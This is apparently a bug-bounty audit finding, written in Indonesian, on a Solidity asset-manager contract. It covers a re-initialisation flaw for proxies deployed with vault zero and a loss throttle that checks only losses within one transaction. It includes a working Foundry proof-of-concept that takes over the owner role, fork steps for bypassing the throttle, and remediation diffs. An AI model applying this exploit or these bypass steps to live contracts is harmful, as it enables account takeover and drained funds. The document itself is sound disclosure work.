# F‑03 — `SharePriceThrottledAssetManager`: init tanpa guard vault‑0 & throttle hanya membatasi kerugian atomik

| | |
|---|---|
| **File** | `persistent/smart-accounts/share-price-throttled-asset-manager/SharePriceThrottledAssetManagerLib.sol` (+ `…Factory.sol`) |
| **Severity** | (a) Low — re‑initialization pada proxy dengan vault 0 · (b) High secara desain (butuh signer) |
| **Status scope** | (a) di scope · (b) berbatasan dengan klausa "privileged address" |
| **PoC** | `tests/F03_SharePriceThrottle_InitAndAtomicOnly.t.sol` |

---

## 1. Vulnerability Summary

### (a) `init()` tidak punya flag "initialized"; guard‑nya adalah alamat vault

```solidity
function init(address _owner, address _vaultProxyAddress, uint64 _lossTolerance,
              uint32 _lossTolerancePeriodDuration, address _shutdowner) external override {
    if (getVaultProxyAddress() != address(0)) revert AlreadyInitialized();   // <-- guard salah
    ...
}
```

Factory juga tidak menolak vault nol:

```solidity
function deployProxy(address _owner, address _vaultProxyAddress, ...) external returns (address proxyAddress_) {
    bytes memory constructData = abi.encodeWithSelector(ISharePriceThrottledAssetManagerLib.init.selector, ...);
    proxyAddress_ = address(new NonUpgradableProxy({_constructData: constructData, _contractLogic: LIB_ADDRESS}));
    ...
}
```

Kontras dengan factory persistent lain di repo yang sama yang memvalidasi:

```solidity
// SingleAssetRedemptionQueueLib.init
if (_vaultProxy == address(0)) revert UndefinedVaultProxy();
// SingleAssetDepositQueueLib.init
if (_vaultProxy == address(0)) revert UndefinedVaultProxy();
```

Jadi **setiap** proxy yang dibuat dengan `_vaultProxyAddress == address(0)` bisa di‑`init()` ulang
**tanpa batas** oleh siapa pun, dan attacker bisa mengganti `owner` **dan** `shutdowner`.

### (b) Throttle hanya mengukur kerugian yang atomik

```solidity
function executeCalls(Call[] calldata _calls) public override {
    uint256 prevSharePrice = __getSharePrice();       // calcGrossShareValue(vault)
    super.executeCalls(_calls);
    __validateAndUpdateThrottle({_prevSharePrice: prevSharePrice});  // bandingkan dgn share price akhir
}
```

`loss = (prev − current)/prev`, diakumulasi dengan replenishment linier, dan wajib `<= lossTolerance`.
Kontrol ini hanya melihat **selisih share price di dalam satu transaksi**. Nilai yang keluar dari fund
tetapi baru tercermin di GAV **setelah** tx (mis. diparkir di external position yang di‑value pada book
value / oracle manual, atau aset yang kemudian di‑revaluasi) tidak pernah dibebankan ke throttle.

## 2. Impact Assessment

**(a)** Dampak langsung terbatas: proxy dengan vault 0 tidak terhubung ke fund mana pun, jadi tidak ada
dana di dalamnya. Nilai temuan: *class of bug* (guard salah) + kemungkinan kehilangan kontrol akun pada
deployment yang salah konfigurasi (owner/shutdowner diambil alih, akun tidak bisa dipakai/di‑shutdown oleh
pihak yang berhak).

**(b)** Signifikan secara desain: kontrak ini ada **khusus** untuk membatasi kerugian maksimum yang bisa
disebabkan signer (mis. hot wallet yang dikompromikan) — `lossTolerance` + `lossTolerancePeriodDuration`.
Bila signer dapat memarkir nilai di instrumen yang di‑value pada harga perolehan (external position) lalu
merealisasikan kerugian di tx berikutnya, batas itu bisa dilewati sepenuhnya ⇒ potensi kehilangan 100% TVL
vault alih‑alih `lossTolerance`. Attacker di sini adalah **signer itu sendiri** (privileged), sehingga
menurut aturan program (`Impacts caused by attacks requiring access to privileged addresses…`) ini
kemungkinan ditolak — tetapi ini adalah *bypass dari kontrol keamanan yang dijanjikan kontrak*, bukan
sekadar "admin jahat".

## 3. Executable Foundry PoC

File lengkap: `tests/F03_SharePriceThrottle_InitAndAtomicOnly.t.sol` — memakai `SharePriceThrottledAssetManagerLib`
dan `SharePriceThrottledAssetManagerFactory` asli.

```solidity
function test_A_proxyDeployedWithZeroVaultIsHijackable() public {
    address proxy = factory.deployProxy({
        _owner: LEGIT_SIGNER,
        _vaultProxyAddress: address(0),        // tidak divalidasi factory maupun init()
        _lossTolerance: 1e17,                  // 10%
        _lossTolerancePeriodDuration: 1 days,
        _shutdowner: LEGIT_SHUTDOWNER
    });

    vm.prank(ATTACKER);
    ISharePriceThrottledAssetManagerLibLike(proxy).init({
        _owner: ATTACKER,
        _vaultProxyAddress: address(0),
        _lossTolerance: 1e18,                  // 100%
        _lossTolerancePeriodDuration: 1,
        _shutdowner: ATTACKER
    });

    assertEq(ISharePriceThrottledAssetManagerLibLike(proxy).getOwner(), ATTACKER);

    // dan bisa diulang tanpa batas
    vm.prank(address(0x1234));
    ISharePriceThrottledAssetManagerLibLike(proxy).init(address(0x1234), address(0), 0, 1, address(0x1234));
    assertEq(ISharePriceThrottledAssetManagerLibLike(proxy).getOwner(), address(0x1234));
}
```

Jalankan:

```powershell
forge test --match-path "tests/arena-poc/F03_SharePriceThrottle_InitAndAtomicOnly.t.sol" -vvv
```

> Catatan: karena guard‑nya bergantung pada nilai vault, proxy yang di‑deploy dengan vault **valid**
> tetap aman (tidak bisa di‑init ulang). PoC ini menunjukkan cacat guard + validasi factory.

Untuk (b) tidak ada PoC lokal (butuh external position + oracle manual pada fork); langkah verifikasinya:

1. Fork Base (tempat `SharePriceThrottledAssetManagerLib` live: `0x7a51…5c22`).
2. Buat vault dengan asset manager = smart account tersebut, isi TVL.
3. `executeCalls([createExternalPosition(...), callOnExternalPosition(...)])` yang memindahkan aset ke
   posisi yang di‑value setara book value → `ThrottleUpdated` tidak ter‑trigger.
4. Tx kedua: revaluasi posisi ke 0 → share price jatuh 100%, throttle tidak pernah melihat kerugiannya.

## 4. Remediation

```diff
+    bool private initialized;
+
     function init(address _owner, address _vaultProxyAddress, uint64 _lossTolerance,
                   uint32 _lossTolerancePeriodDuration, address _shutdowner) external override {
-        if (getVaultProxyAddress() != address(0)) revert AlreadyInitialized();
+        if (initialized) revert AlreadyInitialized();
+        if (_vaultProxyAddress == address(0)) revert UndefinedVaultProxy();
+        initialized = true;
```

dan pada factory:

```diff
     function deployProxy(address _owner, address _vaultProxyAddress, uint64 _lossTolerance,
                          uint32 _lossTolerancePeriodDuration, address _shutdowner) external returns (address proxyAddress_) {
+        if (_vaultProxyAddress == address(0)) revert UndefinedVaultProxy();
```

Untuk (b), mitigasi yang realistis: bandingkan **NAV** (net, termasuk fee terutang) **dan** paksa
mark‑to‑market posisi non‑liquid (batas `lossTolerance` per posisi), atau larang `executeCalls` membuat /
menambah posisi yang valued oleh oracle manual tanpa persetujuan `shutdowner`. Setidaknya dokumentasikan
bahwa throttle hanya menjamin batas kerugian **atomik**.
